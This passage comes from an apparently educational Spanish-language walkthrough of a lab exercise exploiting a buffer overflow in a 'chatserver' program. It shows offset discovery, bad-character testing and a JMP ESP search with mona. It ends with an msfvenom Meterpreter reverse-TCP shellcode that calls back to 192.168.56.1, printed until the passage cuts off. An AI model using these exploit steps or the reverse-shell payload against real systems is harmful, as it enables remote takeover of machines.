</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
</span></span></code></pre></div><p>Añado el patrón creado al payload del script y lo ejecuto tras poner en marcha de nuevo el chatserver con Inmunity Debugger. Lanzo el script y obtengo el valor del registro EIP. Lo copio y lo pego en el comando msf-pattern_offset para saber cuántos caracteres se necesitan para sobrescribir el registro EIP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -q 43396F43 -l <span style="color:#ae81ff">3000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">2007</span>
</span></span></code></pre></div><p>El siguiente paso es encontrar los badcharacters que pueden estropear mi payload. Para ello, ejecuto los siguientes comandos en Inmunity Debugger:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># crear archivo bytearray.bin con el primer badcharacter</span>
</span></span><span style="display:flex;"><span>!mona bytearray -b <span style="color:#e6db74">&#34;\x00&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># comparar referenciando al address con esp</span>
</span></span><span style="display:flex;"><span>!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\c</span>hatserver<span style="color:#ae81ff">\b</span>ytearray.bin -a ESP
</span></span></code></pre></div><p>Ahora solo tengo que añadir todos los badcharacters al payload del script y ejecutarlo para ver cuáles son los badcharacters que pueden afectar al payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 badcharacters.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>09<span style="color:#ae81ff">\x</span>0a<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>0d<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>1b<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>21<span style="color:#ae81ff">\x</span>22<span style="color:#ae81ff">\x</span>23<span style="color:#ae81ff">\x</span>24<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>26<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>29<span style="color:#ae81ff">\x</span>2a<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>2c<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>2e<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>32<span style="color:#ae81ff">\x</span>33<span style="color:#ae81ff">\x</span>34<span style="color:#ae81ff">\x</span>35<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>37<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>39<span style="color:#ae81ff">\x</span>3a<span style="color:#ae81ff">\x</span>3b<span style="color:#ae81ff">\x</span>3c<span style="color:#ae81ff">\x</span>3d<span style="color:#ae81ff">\x</span>3e<span style="color:#ae81ff">\x</span>3f<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>42<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>46<span style="color:#ae81ff">\x</span>47<span style="color:#ae81ff">\x</span>48<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>4c<span style="color:#ae81ff">\x</span>4d<span style="color:#ae81ff">\x</span>4e<span style="color:#ae81ff">\x</span>4f<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>54<span style="color:#ae81ff">\x</span>55<span style="color:#ae81ff">\x</span>56<span style="color:#ae81ff">\x</span>57<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>5a<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5c<span style="color:#ae81ff">\x</span>5d<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>5f<span style="color:#ae81ff">\x</span>60<span style="color:#ae81ff">\x</span>61<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>63<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\x</span>65<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>6b<span style="color:#ae81ff">\x</span>6c<span style="color:#ae81ff">\x</span>6d<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>6f<span style="color:#ae81ff">\x</span>70<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>72<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>74<span style="color:#ae81ff">\x</span>75<span style="color:#ae81ff">\x</span>76<span style="color:#ae81ff">\x</span>77<span style="color:#ae81ff">\x</span>78<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>7a<span style="color:#ae81ff">\x</span>7b<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>7d<span style="color:#ae81ff">\x</span>7e<span style="color:#ae81ff">\x</span>7f<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>82<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>85<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>87<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>8c<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>8e<span style="color:#ae81ff">\x</span>8f<span style="color:#ae81ff">\x</span>90<span style="color:#ae81ff">\x</span>91<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>95<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>97<span style="color:#ae81ff">\x</span>98<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>9a<span style="color:#ae81ff">\x</span>9b<span style="color:#ae81ff">\x</span>9c<span style="color:#ae81ff">\x</span>9d<span style="color:#ae81ff">\x</span>9e<span style="color:#ae81ff">\x</span>9f<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>a2<span style="color:#ae81ff">\x</span>a3<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>a5<span style="color:#ae81ff">\x</span>a6<span style="color:#ae81ff">\x</span>a7<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>a9<span style="color:#ae81ff">\x</span>aa<span style="color:#ae81ff">\x</span>ab<span style="color:#ae81ff">\x</span>ac<span style="color:#ae81ff">\x</span>ad<span style="color:#ae81ff">\x</span>ae<span style="color:#ae81ff">\x</span>af<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>b2<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>b5<span style="color:#ae81ff">\x</span>b6<span style="color:#ae81ff">\x</span>b7<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>b9<span style="color:#ae81ff">\x</span>ba<span style="color:#ae81ff">\x</span>bb<span style="color:#ae81ff">\x</span>bc<span style="color:#ae81ff">\x</span>bd<span style="color:#ae81ff">\x</span>be<span style="color:#ae81ff">\x</span>bf<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>c1<span style="color:#ae81ff">\x</span>c2<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>c4<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>c6<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>c8<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>ca<span style="color:#ae81ff">\x</span>cb<span style="color:#ae81ff">\x</span>cc<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>ce<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>d0<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>d2<span style="color:#ae81ff">\x</span>d3<span style="color:#ae81ff">\x</span>d4<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>d6<span style="color:#ae81ff">\x</span>d7<span style="color:#ae81ff">\x</span>d8<span style="color:#ae81ff">\x</span>d9<span style="color:#ae81ff">\x</span>da<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>dc<span style="color:#ae81ff">\x</span>dd<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>e0<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>e4<span style="color:#ae81ff">\x</span>e5<span style="color:#ae81ff">\x</span>e6<span style="color:#ae81ff">\x</span>e7<span style="color:#ae81ff">\x</span>e8<span style="color:#ae81ff">\x</span>e9<span style="color:#ae81ff">\x</span>ea<span style="color:#ae81ff">\x</span>eb<span style="color:#ae81ff">\x</span>ec<span style="color:#ae81ff">\x</span>ed<span style="color:#ae81ff">\x</span>ee<span style="color:#ae81ff">\x</span>ef<span style="color:#ae81ff">\x</span>f0<span style="color:#ae81ff">\x</span>f1<span style="color:#ae81ff">\x</span>f2<span style="color:#ae81ff">\x</span>f3<span style="color:#ae81ff">\x</span>f4<span style="color:#ae81ff">\x</span>f5<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>f9<span style="color:#ae81ff">\x</span>fa<span style="color:#ae81ff">\x</span>fb<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>fd<span style="color:#ae81ff">\x</span>fe<span style="color:#ae81ff">\x</span>ff
</span></span></code></pre></div><p>Al lanzar de nuevo el script, ejecuto el comando compare de mona y veo que no hay mas caracteres que el \x00</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\c</span>hatserver<span style="color:#ae81ff">\b</span>ytearray.bin -a ESP
</span></span></code></pre></div><p>Una vez hecho esto, tengo que encontrar un salto a una instrucción JMP ESP para sobrescribir el registro EIP y que apunte a la instrucción JMP ESP. Para ello, ejecuto el siguiente comando en Inmunity Debugger:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona jmp -r esp -cpb <span style="color:#e6db74">&#34;\x00&#34;</span>
</span></span></code></pre></div><p>Una de las direcciones de salto que me devuelve es 625014DF. Ahora solo tengo que añadir esta dirección transformada al payload del script y ejecutarlo para ver si sobrescribe el registro EIP con la dirección de salto. La paso por un script de python para que me devuelva la dirección de salto en el formato que necesito.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Run:</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">jump_address.py &lt;jump_point_address&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>address <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n1 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>n2 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>n3 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>n4 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">retn =  &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n4 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n3 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n2 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python jump_address.py 625014DF
</span></span></code></pre></div><p>Con esto ya estoy listo para sobrescribir el registro EIP con la dirección de salto. Ahora solo tengo que añadir el shellcode al payload del script y ejecutarlo para ver si se ejecuta el shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.56.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00&#34;</span> -f c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">12</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">1632</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xba\x54\x0b\x6e\x5c\xda\xd6\xd9\x74\x24\xf4\x5e\x31\xc9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x59\x31\x56\x14\x83\xc6\x04\x03\x56\x10\xb6\xfe\x92&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb4\xb9\x01\x6b\x45\xa5\x30\xb9\x21\xae\x61\x0d\x23\x55&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0e\x3f\x3f\x1e\x43\xd4\x30\x97\x2e\xf2\xc5\xa5\x86\xcb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x26\x78\x17\x87\xe5\x1b\xeb\xda\x39\xfb\xd2\x14\x4c\xfa&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x13\xe3\x3a\x13\xc9\xa3\x4f\xb9\xfe\xc0\x12\x01\xfe\x06&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x19\x39\x78\x22\xde\xcd\x34\x2d\x0f\xa6\x9d\x0d\xff\xb9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xce\xc5\xb7\xa1\x75\x10\x33\xed\x44\x5c\xf5\x86\x93\x29&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x07\x4e\xea\xed\xa4\xaf\xc2\xe3\xb5\xe8\xe5\x1b\xc0\x02&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x16\xa1\xd3\xd1\x64\x7d\x51\xc5\xcf\xf6\xc1\x21\xf1\xdb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x94\xa2\xfd\x90\xd3\xec\xe1\x27\x37\x87\x1e\xa3\xb6\x47&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x97\xf7\x9c\x43\xf3\xac\xbd\xd2\x59\x02\xc1\x04\x05\xfb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x67\x4f\xa4\xea\x18\xb0\x36\x13\x45\x26\xfa\xde\x76\xb6&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x94\x69\x04\x84\x3b\xc2\x82\xa4\xb4\xcc\x55\xbd\xd3\xee&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x8a\x05\xb3\x10\x2b\x75\x9d\xd6\x7f\x25\xb5\xff\xff\xae&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x45\xff\xd5\x5a\x4c\x97\x15\x32\x68\x66\xfe\x40\x89\x79&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xa2\xcd\x6f\x29\x0a\x9d\x3f\x8a\xfa\x5d\x90\x62\x11\x52&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xcf\x93\x1a\xb9\x78\x39\xf5\x17\xd0\xd6\x6c\x32\xaa\x47&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x70\xe9\xd6\x48\xfa\x1b\x26\x06\x0b\x6e\x34\x7f\x6c\x90&#34;</span>
